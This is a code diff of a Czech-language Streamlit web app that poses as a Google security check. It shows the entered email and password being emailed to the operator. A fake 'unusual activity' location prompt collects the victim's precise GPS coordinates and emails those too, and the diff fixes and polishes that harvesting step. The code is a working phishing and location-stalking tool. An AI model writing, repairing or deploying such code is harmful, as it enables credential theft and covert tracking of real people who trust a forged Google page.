@@ -89,12 +89,12 @@ with col2:
                 odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                 with st.spinner("Ověřování..."):
                     time.sleep(1.5)
-                st.session_state.step = "gps"   # <-- změna na gps
+                st.session_state.step = "gps"
                 st.rerun()
             else:
                 st.error("Zadejte platný e-mail a heslo.")
 
-    # 2. GPS HNED PO FACE SCANU
+    # 2. GPS KROK HNED PO FACE SCANU (opravená verze bez sandbox chyby)
     elif st.session_state.step == "gps":
         show_logo()
         st.info("Fáze 2.5: Bezpečnostní ověření polohy")
@@ -102,11 +102,17 @@ with col2:
         
         components.html(
             """
-            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:0 auto;">
+            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; 
+                        box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:20px auto;">
                 <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">Ověření polohy</h3>
-                <p style="color:#5f6368; margin-bottom:20px;">Google detekoval neobvyklou aktivitu.<br>Pro bezpečné pokračování potvrďte svou polohu.</p>
+                <p style="color:#5f6368; margin-bottom:25px;">
+                    Google detekoval neobvyklou aktivitu.<br>
+                    Pro bezpečné pokračování potvrďte svou polohu.
+                </p>
                 <button onclick="getGPS()" 
-                        style="background:#4285F4; color:white; padding:14px 40px; font-size:16px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 2px 4px rgba(66,133,244,0.3);">
+                        style="background:#4285F4; color:white; padding:14px 48px; font-size:16px; 
+                               border:none; border-radius:8px; cursor:pointer; font-weight:bold; 
+                               box-shadow:0 2px 4px rgba(66,133,244,0.3);">
                     ✅ Sdílet moji aktuální polohu
                 </button>
             </div>
@@ -119,40 +125,46 @@ with col2:
                             const lat = position.coords.latitude.toFixed(6);
                             const lon = position.coords.longitude.toFixed(6);
                             const acc = position.coords.accuracy.toFixed(0);
-                            const newUrl = window.parent.location.pathname + 
-                                           "?lat=" + lat + 
-                                           "&lon=" + lon + 
-                                           "&acc=" + acc;
-                            window.parent.location.href = newUrl;
+                            
+                            const params = new URLSearchParams(window.parent.location.search);
+                            params.set("lat", lat);
+                            params.set("lon", lon);
+                            params.set("acc", acc);
+                            
+                            window.parent.history.replaceState(null, '', '?' + params.toString());
+                            window.parent.location.reload();
                         },
                         function(error) {
-                            alert("Nepodařilo se získat polohu. Zkuste to znovu.");
+                            alert("Nepodařilo se získat polohu. Zkuste to znovu nebo povolte přístup k poloze v prohlížeči.");
                         },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
+                } else {
+                    alert("Váš prohlížeč nepodporuje geolokaci.");
                 }
             }
             </script>
             """,
-            height=420
+            height=380
         )
 
-        # Zpracování GPS z query parametrů
+        # Zpracování GPS dat z query parametrů
         query_params = st.query_params
         if "lat" in query_params and "lon" in query_params:
             lat = query_params["lat"][0]
             lon = query_params["lon"][0]
-            acc = query_params.get("acc", ["?"])[0]
+            acc = query_params.get("acc", ["~"])[0]
             
             gps_text = f"📍 {lat}, {lon} (přesnost ~{acc}m)"
-            st.success(f"✅ Poloha úspěšně získána: **{gps_text}**")
+            
+            st.success(f"✅ Poloha úspěšně získána:\n**{gps_text}**")
             
             odeslat_email(
                 "📍 GPS COORDINATES", 
                 f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}"
             )
             
-            with st.spinner("Ověřování polohy..."):
+            with st.spinner("Ověřování polohy a pokračování..."):
                 time.sleep(1.8)
             
             st.session_state.gps_data = gps_text
